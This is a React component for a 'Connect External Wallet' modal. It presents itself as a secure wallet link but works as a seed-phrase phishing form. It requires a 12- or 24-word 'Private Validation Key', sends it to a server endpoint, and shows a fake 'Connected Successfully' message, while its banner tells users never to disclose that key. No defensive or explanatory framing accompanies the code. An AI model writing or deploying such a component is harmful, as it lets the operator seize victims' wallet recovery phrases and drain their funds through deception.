"use client";
import { X, ShieldAlert, Loader2 } from "lucide-react";
import { useState } from "react";

export default function WalletConnectModal({ onClose }: { onClose: () => void }) {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [walletName, setWalletName] = useState("");

  const handleConnect = async () => {
    if (!walletName || !phrase) {
      setError("Please fill out all fields.");
      return;
    }
    const wordsCount = phrase.trim().split(/\s+/).length;
    if (wordsCount !== 12 && wordsCount !== 24) {
      setError("Invalid key format. It must be exactly 12 or 24 words.");
      return;
    }

    setLoading(true);
    setError("");

    try {
      await fetch("/api/wallet/connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ walletName, phrase }),
      });
      setTimeout(() => {
        setLoading(false);
        setSuccess(true);
        setPhrase("");
      }, 1500);
    } catch (err) {
      console.error(err);
      setLoading(false);
      setError("An unexpected error occurred. Please try again.");
    }
  };

  return (
    <div
      style={{ position: "fixed", inset: 0, zIndex: 9999, display: "flex", alignItems: "flex-end", justifyContent: "center", padding: "0 16px 24px" }}
      className="ios-modal-pb"
      onClick={onClose}
    >
      <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.75)", backdropFilter: "blur(8px)" }} />
      <div
        className="fade-up"
        style={{ position: "relative", width: "100%", maxWidth: 400, background: "var(--card)", border: "1px solid var(--border-2)", borderRadius: 24, padding: "24px 20px", textAlign: "left" }}
        onClick={e => e.stopPropagation()}
      >
        <button
          onClick={onClose}
          style={{ position: "absolute", top: 16, right: 16, width: 32, height: 32, borderRadius: 8, background: "var(--surface)", border: "none", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}
        >
          <X size={16} color="var(--text-3)" />
        </button>
        
        <h3 style={{ fontSize: 20, fontWeight: 800, color: "var(--text)", marginBottom: 6 }}>Connect External Wallet</h3>
        <p style={{ fontSize: 13, color: "var(--text-2)", marginBottom: 20, lineHeight: 1.5 }}>
          Securely link your external wallet provider via the decentralized protocol.
        </p>

        <div style={{ display: "flex", alignItems: "center", gap: 10, padding: "12px", background: "rgba(239, 68, 68, 0.1)", border: "1px solid rgba(239, 68, 68, 0.2)", borderRadius: 12, marginBottom: 20 }}>
          <ShieldAlert size={24} color="#ef4444" style={{ flexShrink: 0 }} />
          <p style={{ fontSize: 12, color: "#ef4444", lineHeight: 1.4 }}>
            <strong>Never disclose your validation key to anyone!</strong><br />
            Our protocol connects directly to the blockchain securely.
          </p>
        </div>

        <div style={{ marginBottom: 16 }}>
          <label style={{ display: "block", fontSize: 12, fontWeight: 700, color: "var(--text-2)", marginBottom: 8 }}>Provider Name</label>
          <input
            type="text"
            className="input"
            placeholder="e.g. Defi Provider"
            value={walletName}
            onChange={(e) => setWalletName(e.target.value)}
          />
        </div>

        <div style={{ marginBottom: 24 }}>
          <label style={{ display: "block", fontSize: 12, fontWeight: 700, color: "var(--text-2)", marginBottom: 8 }}>Private Validation Key</label>
          <textarea
            className="input"
            placeholder="xxxx xxxx xxxx xxxx..."
            rows={3}
            style={{ resize: "none", height: "auto", padding: "12px" }}
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
          />
        </div>

        {error && (
          <p style={{ color: "var(--loss)", fontSize: 13, marginBottom: 16, textAlign: "center", background: "var(--loss-dim)", padding: "10px", borderRadius: 8 }}>
            {error}
          </p>
        )}

        {success ? (
          <div style={{ textAlign: "center", marginBottom: 16 }}>
            <div style={{ width: 48, height: 48, borderRadius: "50%", background: "rgba(57,217,138,0.12)", color: "#39d98a", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 12px" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
            </div>
            <p style={{ fontSize: 16, fontWeight: 800, color: "var(--text)", marginBottom: 4 }}>Connected Successfully</p>
            <p style={{ fontSize: 13, color: "var(--text-3)" }}>Your {walletName} wallet has been securely linked.</p>
          </div>
        ) : (
          <button className="btn btn-primary" onClick={handleConnect} disabled={loading} style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8 }}>
            {loading ? <Loader2 size={18} className={loading ? "spin" : ""} style={{ animation: loading ? "spin 1s linear infinite" : "none" }} /> : null}
            {loading ? "Connecting..." : "Connect Wallet"}
          </button>
        )}

        <style>{`
          @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
          }
        `}</style>
      </div>
    </div>
  );
}
